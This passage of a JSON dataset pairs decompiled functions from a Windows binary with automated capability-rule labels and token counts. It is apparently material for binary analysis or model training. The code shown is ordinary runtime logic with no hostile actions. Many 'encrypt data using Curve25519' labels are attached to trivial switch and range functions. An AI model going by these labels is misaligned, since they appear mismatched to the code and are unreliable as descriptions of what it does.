        "decompiled_code": "\nvoid __fastcall fcn.004306d8(uchar *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 0;\n    uVar1 = param_2 & 0xff;\n    if (uVar1 < 0xf) {\n        if (uVar1 - 2 < 5) {\n            *(param_1 + 4) = 1;\n            iVar2 = 2;\n            goto code_r0x00430751;\n        }\n        if (uVar1 - 7 < 8) {\n            *(param_1 + 4) = 2;\n            iVar2 = 7;\n            goto code_r0x00430751;\n        }\n    }\n    else {\n        if (uVar1 - 0xf < 0xc) {\n            *(param_1 + 4) = 3;\n            iVar2 = 0xf;\n            goto code_r0x00430751;\n        }\n        if (uVar1 - 0x1b < 2) {\n            *(param_1 + 4) = 4;\n            iVar2 = 0x1b;\n            goto code_r0x00430751;\n        }\n        if (uVar1 - 0x1b == 2) {\n            *(param_1 + 4) = 5;\n            iVar2 = 0x1d;\n            goto code_r0x00430751;\n        }\n    }\n    *(param_1 + 4) = 0;\n    iVar2 = 0;\ncode_r0x00430751:\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 389
    },
    "0043075c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043075c(uchar *param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    \n    *param_1 = 3;\n    uVar1 = param_2 - 2;\n    if (uVar1 < 7) {\n        *(param_1 + 4) = 1;\n        iVar2 = 2;\n    }\n    else if (uVar1 == 7) {\n        *(param_1 + 4) = 2;\n        iVar2 = 9;\n    }\n    else {\n        *(param_1 + 4) = 0;\n        iVar2 = 0;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar2) + 1;\n    return;\n}\n",
        "token_count": 188
    },
    "00430798": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430798(uchar *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x17;\n    // switch table (38 cases) at 0x43081e\n    switch(param_2 & 0xff) {\n    default:\n        *(param_1 + 4) = 0;\n        iVar1 = 0;\n        break;\n    case 2:\n    case 3:\n    case 4:\n        *(param_1 + 4) = 1;\n        iVar1 = 2;\n        break;\n    case 5:\n    case 6:\n    case 7:\n        *(param_1 + 4) = 2;\n        iVar1 = 5;\n        break;\n    case 8:\n    case 9:\n    case 10:\n        *(param_1 + 4) = 3;\n        iVar1 = 8;\n        break;\n    case 0xb:\n    case 0xc:\n    case 0xd:\n        *(param_1 + 4) = 4;\n        iVar1 = 0xb;\n        break;\n    case 0xe:\n    case 0xf:\n    case 0x10:\n        *(param_1 + 4) = 5;\n        iVar1 = 0xe;\n        break;\n    case 0x11:\n    case 0x12:\n    case 0x13:\n        *(param_1 + 4) = 6;\n        iVar1 = 0x11;\n        break;\n    case 0x14:\n    case 0x15:\n        *(param_1 + 4) = 7;\n        iVar1 = 0x14;\n        break;\n    case 0x16:\n    case 0x17:\n        *(param_1 + 4) = 8;\n        iVar1 = 0x16;\n        break;\n    case 0x18:\n    case 0x19:\n        *(param_1 + 4) = 9;\n        iVar1 = 0x18;\n        break;\n    case 0x1a:\n    case 0x1b:\n        *(param_1 + 4) = 10;\n        iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1828
    },
    "0045fc78": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fc78(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while (0x17 < *(in_EAX + 10)) {\n        *(in_EAX + 8) = *(in_EAX + 8) + *((param_2 & 0x7f) * 4 + 0x483f98);\n        *(in_EAX + 10) = *(in_EAX + 10) + *((param_2 & 0x7f) * 4 + 0x483fac);\n        fcn.0045fc1c();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0045fcc0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fcc0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while (0x3b < *(in_EAX + 0xc)) {\n        *(in_EAX + 10) = *(in_EAX + 10) + *((param_2 & 0x7f) * 4 + 0x483f98);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + *((param_2 & 0x7f) * 4 + 0x483fb4);\n        fcn.0045fc78();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0045fd08": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fd08(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while (0x3b < *(in_EAX + 0xe)) {\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + *((param_2 & 0x7f) * 4 + 0x483f98);\n        *(in_EAX + 0xe) = *(in_EAX + 0xe) + *((param_2 & 0x7f) * 4 + 0x483fbc);\n        fcn.0045fcc0();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0046678c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0046678c(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.0046678c::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x004667e3;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x004667e3:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x466837;\n    fcn.0046677c();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x483590;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x466853;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x466761;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.0046678c::var_10h_2;\n        fcn.00404850();\n        arg_10h = uStack116;\n        fcn.00404850();\n        puStack164 = 0x4666f4;\n        arg_ch_01 = uStack120;\n        fcn.00404850();\n        puStack164 = 0x466703;\n        iStack168 = fcn.00465a78(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x466718;\n            fcn.0040516c();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.004659a8(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.004045bc();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00403fe1. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x485014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x466768;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1666
    },
    "0046c1d8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046c1d8(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x21) = param_2;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x1c) = *((param_2 & 0x7f) + 0x48418c);\n    fcn.0041ceb0();\n    return;\n}\n",
        "token_count": 111
    },
    "0046d028": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d028(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46d07a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    bVar1 = param_2 < 7;\n    if (param_2 < 8) {\n        bVar1 = (*(in_EAX + 0x18 + ((param_2 & 0x7f) >> 3)) >> (param_2 & 7) & 1) != 0;\n    }\n    if (!bVar1) {\n        fcn.0040675c();\n        fcn.0046bba0();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x46d081;\n    uStack24 = 0x46d079;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 267
    },
    "00403098": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403098(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    \n    if (*param_2 < param_1) {\n        param_1 = *param_2;\n    }\n    *in_EAX = param_1;\n    fcn.00402d34();\n    return;\n}\n",
        "token_count": 83
    },
    "00403354": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403354(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    \n    param_1 = param_1 & 0xff;\n    do {\n        if (param_1 == 0) {\n            return;\n        }\n        param_1 = param_1 - 1;\n        cVar1 = *in_EAX;\n        cVar2 = *param_2;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + 1;\n    } while (cVar1 == cVar2);\n    return;\n}\n",
        "token_count": 148
    },
    "00404084": {
        "rules": [
            "calculate modulo 256 via x86 assembly",
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404084(int32_t *arg_8h)\n\n{\n    fcn.00402c3c();\n    return;\n}\n",
        "token_count": 34
    },
    "0040b8d4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b8d4(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    while( true ) {\n        uVar2 = fcn.00404888();\n        if ((uVar2 < *param_2) ||\n           (cVar1 = *(in_EAX + -1 + *param_2),  uVar2 = *param_2 & 0xffffff00 | cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar2 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            uVar2 = fcn.0040d564();\n            *param_2 = uVar2;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "0040cf0c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cf0c(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40cfc7;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040cca0();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40cf65;\n            iVar3 = fcn.0040cd38(&stack0xfffffffc);\n            goto code_r0x0040cf9a;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040cf0c::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.0040675c();\n            iVar3 = fcn.0040c918(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040cf9a;\n        }\n    }\n    iVar3 = fcn.0040c8dc();\ncode_r0x0040cf9a:\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40cfce;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 486
    },
    "0040d3a0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3a0(int32_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404888();\n    iVar4 = 1;\n    iVar3 = 1;\n    while ((iVar3 < iVar1 && (iVar4 < in_EDX))) {\n        iVar4 = iVar4 + 1;\n        uVar2 = *(in_EAX + -1 + iVar3);\n        if ((*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) == 0) {\n            iVar3 = iVar3 + 1;\n        }\n        else {\n            iVar3 = fcn.0040d564();\n        }\n    }\n    if (((iVar4 == in_EDX) && (iVar3 < iVar1)) &&\n       (uVar2 = *(in_EAX + -1 + iVar3),  (*((uVar2 >> 3) + 0x483110) >> (uVar2 & 7) & 1) != 0)) {\n        iVar3 = fcn.0040d564();\n        iVar3 = iVar3 + -1;\n    }\n    *in_ECX = iVar4;\n    *arg_8h = iVar3;\n    return;\n}\n",
        "token_count": 350
    },
    "0040d82c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d82c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint var_1h;\n    \n    uVar3 = fcn.0040d7b8(arg_8h + -0x14);\n    sub.kernel32.dll_GetCPInfo(uVar3);\n    for (iVar5 = 0; (iVar5 < 0xc && ((*(arg_8h + -0xe + iVar5) | *(arg_8h + -0xd + iVar5)) != 0)); iVar5 = iVar5 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar5);\n        uVar1 = *(arg_8h + -0xd + iVar5);\n        if (var_1h <= uVar1) {\n            cVar4 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x483110;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar4 = cVar4 + -1;\n            } while (cVar4 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "00425c78": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00425c78(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (in_EAX < 0) {\n        sub.user32.dll_GetSysColor(in_EAX & 0xff);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00437578": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00437578(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puStack32;\n    uint8_t *puStack24;\n    \n    iVar1 = fcn.00404888();\n    fcn.00404c14();\n    if (in_EAX != 0) {\n        puStack32 = fcn.00404a88();\n        puVar2 = puStack32 + iVar1;\n        iVar3 = fcn.00404a88();\n        puVar4 = iVar1 + iVar3;\n        while (puStack32 < puVar2) {\n            iVar1 = 1;\n            if ((*(*0x48483c + (*puStack32 >> 3)) >> (*puStack32 & 7) & 1) != 0) {\n                iVar1 = fcn.0040d4f4();\n            }\n            puVar4 = puVar4 + -iVar1;\n            puStack24 = puVar4;\n            if (-1 < iVar1 + -1) {\n                do {\n                    *puStack24 = *puStack32;\n                    puStack32 = puStack32 + 1;\n                    iVar1 = iVar1 + -1;\n                    puStack24 = puStack24 + 1;\n                } while (iVar1 != 0);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "004490b8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004490b8(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x44913e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x485ab0 == 0;\n    *0x485ab0 = *0x485ab0 + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion_1();\n        *0x485aac = 3 < uVar1;\n        fcn.00448e84();\n        fcn.0041bcf0();\n        fcn.0041bd90();\n        fcn.0041bd3c();\n        fcn.0041bd3c();\n        fcn.0041bd3c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 240
    },
    "00451fe8": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00451fe8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.004045c8();\n    iVar3 = 1;\n    iVar1 = fcn.00404888();\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x48483c + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.004047b0();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "00462e5c": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00462e5c(void)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint8_t uStack52;\n    uint8_t *puStack48;\n    uint auStack44 [8];\n    \n    uVar1 = **0x4847fc;\n    uStack52 = 0;\n    puStack48 = in_EAX;\n    do {\n        uVar2 = *puStack48;\n        puVar4 = puStack48;\n        if (uVar2 == 0) {\ncode_r0x00462eb7:\n            return puVar4 & 0xffffff00 | uStack52;\n        }\n        puVar6 = 0x462ec4;\n        puVar7 = auStack44;\n        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        puVar4 = uVar1;\n        puVar3 = auStack44 + (puVar4 >> 3);\n        *puVar3 = *puVar3 | '\\x01' << (puVar4 & 7);\n        if ((*(auStack44 + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n            uStack52 = 1;\n            goto code_r0x00462eb7;\n        }\n        puStack48 = puStack48 + 1;\n    } while( true );\n}\n",
        "token_count": 415
    },
    "00464070": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
